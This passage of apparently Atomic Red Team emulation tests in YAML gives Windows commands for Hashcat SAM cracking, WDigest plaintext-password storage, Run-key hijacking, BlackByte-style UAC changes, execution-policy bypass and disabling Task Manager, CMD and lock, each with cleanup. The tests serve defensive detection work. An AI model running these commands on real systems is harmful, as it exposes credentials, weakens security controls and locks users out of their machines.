      default: $env:TEMP\nimgrab.exe
  executor:
    command: |
      cmd /c nimgrab.exe #{remote_file} #{destination_path}
    cleanup_command: |
      del #{destination_path} >nul 2>&1
    name: command_prompt
  dependency_executor_name: powershell 
  dependencies: 
    - description: |
        NimGrab must be installed on system.
      prereq_command: |
        if (Test-Path "#{local_nimgrab}") {exit 0} else {exit 1}
      get_prereq_command: |
        Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile $env:temp\nim.zip
        Expand-Archive -Path $env:temp\nim.zip -DestinationPath $env:temp\nim -Force
        Copy-Item $env:temp\nim\nim-1.6.6\bin\nimgrab.exe #{local_nimgrab}
        Remove-Item $env:temp\nim
        Remove-Item $env:temp\nim.zip
- name: iwr or Invoke Web-Request download  
  auto_generated_guid: c01cad7f-7a4c-49df-985e-b190dcf6a279
  description: |  
    Use 'iwr' or "Invoke-WebRequest" -URI argument to download a file from the web. Note: without -URI also works in some versions.
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Local path to place file
      type: Path
      default: '%temp%\Atomic-license.txt'
  executor:
    command: |
      powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
    cleanup_command: |
      del %temp%\Atomic-license.txt >nul 2>&1
    name: command_prompt
    elevation_required: true
    
    
    
- name: Password Cracking with Hashcat
  auto_generated_guid: 6d27df5d-69d4-4c91-bc33-5983ffe91692
  description: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against
  supported_platforms:
  - windows
  input_arguments:
    hashcat_exe:
      description: Path to Hashcat executable
      type: String
      default: '%temp%\hashcat6\hashcat-6.1.1\hashcat.exe'
    input_file_sam:
      description: Path to SAM file
      type: String
      default: PathToAtomicsFolder\T1110.002\src\sam.txt
    input_file_passwords:
      description: Path to password list
      type: String
      default: PathToAtomicsFolder\T1110.002\src\password.lst
  dependency_executor_name: powershell
  dependencies:
  - description: Hashcat must exist on disk at specified location (#{hashcat_exe})
    prereq_command: 'if (Test-Path  $(cmd /c echo #{hashcat_exe})) {exit 0} else {exit 1}'
    get_prereq_command: |-
      Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "$env:TEMP\7z1900.exe"
      Start-Process -FilePath "$env:Temp\7z1900.exe" -ArgumentList "/S /D=$env:temp\7zi" -NoNewWindow
      Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "$env:TEMP\hashcat6.7z"
      Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
      New-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null
      Move-Item $env:Temp\hashcat-unzip\hashcat-6.1.1\* $(cmd /c echo #{hashcat_exe}\..) -Force -ErrorAction Ignore
  executor:
    command: |-
      cd #{hashcat_exe}\..
      #{hashcat_exe} -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}
    cleanup_command: |-
      del %temp%\hashcat6.7z >nul 2>&1
      del %temp%\7z1900.exe >nul 2>&1
      del %temp%\7z /Q /S >nul 2>&1
      del %temp%\hashcat-unzip /Q /S >nul 2>&1
    name: command_prompt
    elevation_required: true



- name: Modify Registry of Current User Profile - cmd
  auto_generated_guid: 1324796b-d0f6-455a-b4ae-21ffee6aa6b9
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message "The operation completed successfully."
    will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
    cleanup_command: |
      reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Modify Registry of Local Machine - cmd
  auto_generated_guid: 282f929a-6bc5-42b8-bd93-960c3ba35afe
  description: |
    Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
    CMD is ran as Administrative rights. Upon execution, the message "The operation completed successfully."
    will be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
  supported_platforms:
  - windows
  input_arguments:
    new_executable:
      description: New executable to run on startup instead of Windows Defender
      type: String
      default: calc.exe
  executor:
    command: |
      reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
    cleanup_command: |
      reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Modify registry to store logon credentials
  auto_generated_guid: c0413fb5-33e2-40b7-9b6f-60b29f4a7a18
  description: |
    Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
    Upon execution, the message "The operation completed successfully." will be displayed.
    Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Add domain to Trusted sites Zone
  auto_generated_guid: cf447677-5a4e-4937-a82c-e47d254afd57
  description: |
    Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
    Upon execution, details of the new registry entries will be displayed.
    Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.

    https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
  supported_platforms:
  - windows
  input_arguments:
    bad_domain:
      description: Domain to add to trusted site zone
      type: String
      default: bad-domain.com
  executor:
    command: |
      $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"
      $name ="bad-subdomain"
      new-item $key -Name $name -Force
      new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
      new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
      new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
    cleanup_command: |
      $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"
      Remove-item  $key -Recurse -ErrorAction Ignore
    name: powershell
- name: Javascript in registry
  auto_generated_guid: 15f44ea9-4571-4837-be9e-802431a7bfae
  description: |
    Upon execution, a javascript block will be placed in the registry for persistence.
    Additionally, open Registry Editor to view the modified entry in HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings.
  supported_platforms:
  - windows
  executor:
    command: |
      New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
    cleanup_command: |
      Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -ErrorAction Ignore
    name: powershell
- name: Change Powershell Execution Policy to Bypass
  auto_generated_guid: f3a6cceb-06c9-48e5-8df8-8867a6814245
  description: |
    Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.
    They can either specify it during the execution of the powershell script or change the registry value for it.
  supported_platforms:
  - windows
  input_arguments:
    default_execution_policy:
      description: Specify the default poweshell execution policy
      type: String
      default: Default
  executor:
    command: |
      Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
    cleanup_command: |
      try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}
    name: powershell
- name: BlackByte Ransomware Registry Changes - CMD
  auto_generated_guid: 4f4e2f9f-6209-4fcf-9b15-3b7455706f5b
  description: |
    This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
    The steps are as follows:
    <ol>
        <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
        <li>2. Enable OS to share network connections between different privilege levels</li>
        <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
    </ol>
    The registry keys and their respective values will be created upon successful execution.
  supported_platforms:
  - windows
  executor:
    command: |
      cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
      cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f
      cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1
      reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLinkedConnections /f >nul 2>&1
      reg delete HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\ /v LongPathsEnabled /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: BlackByte Ransomware Registry Changes - Powershell
  auto_generated_guid: 0b79c06f-c788-44a2-8630-d69051f1123d
  description: |
    This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
    The steps are as follows:
    <ol>
        <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
        <li>2. Enable OS to share network connections between different privilege levels</li>
        <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
    </ol>
    The registry keys and their respective values will be created upon successful execution.
  supported_platforms:
  - windows
  executor:
    command: |
      New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
      New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
      New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
    cleanup_command: |
      Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore
      Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -Force -ErrorAction Ignore
      Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -Force -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Disable Windows Registry Tool
  auto_generated_guid: ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.
    See example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
    cleanup_command: |
      powershell Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Name DisableRegistryTools -ErrorAction Ignore
    name: command_prompt
    elevation_required: true
- name: Disable Windows CMD application
  auto_generated_guid: d2561a6d-72bd-408c-b150-13efe1801c2a
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.
    See example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry
  supported_platforms:
  - windows
  executor:
    command: |
      New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1
    cleanup_command: |
      Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Disable Windows Task Manager application
  auto_generated_guid: af254e70-dd0e-4de6-9afe-a994d9ea8b62
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.
    See example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Disable Windows Notification Center
  auto_generated_guid: c0d6d67f-1f63-42cc-95c0-5fd6b20082ad
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.
    See how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Disable Windows Shutdown Button
  auto_generated_guid: 6e0d1131-2d7e-4905-8ca5-d6172f05d03d
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.
    See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
    cleanup_command: |
      reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Disable Windows LogOff Button 
  auto_generated_guid: e246578a-c24d-46a7-9237-0213ff86fb0c
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.
    See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /f >nul 2>&1
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Disable Windows Change Password Feature
  auto_generated_guid: d4a6da40-618f-454d-9a9e-26af552aaeb0
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.
    See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Disable Windows Lock Workstation Feature
  auto_generated_guid: 3dacb0d2-46ee-4c27-ac1b-f9886bf91a56
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.
    See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Activate Windows NoDesktop Group Policy Feature
  auto_generated_guid: 93386d41-525c-4a1b-8235-134a628dee17
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Activate Windows NoRun Group Policy Feature
  auto_generated_guid: d49ff3cc-8168-4123-b5b3-f057d9abbd55
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.
    Take note that some Group Policy changes might require a restart to take effect.
    See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /f 
    name: command_prompt
    elevation_required: true
- name: Activate Windows NoFind Group Policy Feature
  auto_generated_guid: ffbb407e-7f1d-4c95-b22e-548169db1fbd
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.
    Take note that some Group Policy changes might require a restart to take effect.
    See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Activate Windows NoControlPanel Group Policy Feature
  auto_generated_guid: a450e469-ba54-4de1-9deb-9023a6111690
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Activate Windows NoFileMenu Group Policy Feature
  auto_generated_guid: 5e27bdb4-7fd9-455d-a2b5-4b4b22c9dea4
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /f >nul 2>&1
    name: command_prompt
    elevation_required: true  
- name: Activate Windows NoClose Group Policy Feature
  auto_generated_guid: 12f50e15-dbc6-478b-a801-a746e8ba1723
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /f >nul 2>&1
    name: command_prompt
    elevation_required: true 
- name: Activate Windows NoSetTaskbar Group Policy Feature
  auto_generated_guid: d29b7faf-7355-4036-9ed3-719bd17951ed
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Activate Windows NoTrayContextMenu Group Policy Feature
  auto_generated_guid: 4d72d4b1-fa7b-4374-b423-0fe326da49d2
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Activate Windows NoPropertiesMyDocuments Group Policy Feature
  auto_generated_guid: 20fc9daa-bd48-4325-9aff-81b967a84b1d
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from "My Documents icon" Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPropertiesMyDocuments /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Hide Windows Clock Group Policy Feature
  auto_generated_guid: 8023db1e-ad06-4966-934b-b6a0ae52689e
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Windows HideSCAHealth Group Policy Feature
  auto_generated_guid: a4637291-40b1-4a96-8c82-b28f1d73e54e
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Windows HideSCANetwork Group Policy Feature
  auto_generated_guid: 3e757ce7-eca0-411a-9583-1c33b8508d52
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Windows HideSCAPower Group Policy Feature
  auto_generated_guid: 8d85a5d8-702f-436f-bc78-fcd9119496fc
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect.
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Windows HideSCAVolume Group Policy Feature
  auto_generated_guid: 7f037590-b4c6-4f13-b3cc-e424c5ab8ade
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. 
    Take note that some Group Policy changes might require a restart to take effect..
    See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Windows Modify Show Compress Color And Info Tip Registry
  auto_generated_guid: 795d3248-0394-4d4d-8e86-4e8df2a2693f
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. 
    See how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html
  supported_platforms:
  - windows
  executor:
    command: |
      reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f
      reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f
    cleanup_command: |
      reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /f >nul 2>&1
      reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Windows Powershell Logging Disabled
  auto_generated_guid: 95b25212-91a7-42ff-9613-124aca6845a8
  description: |
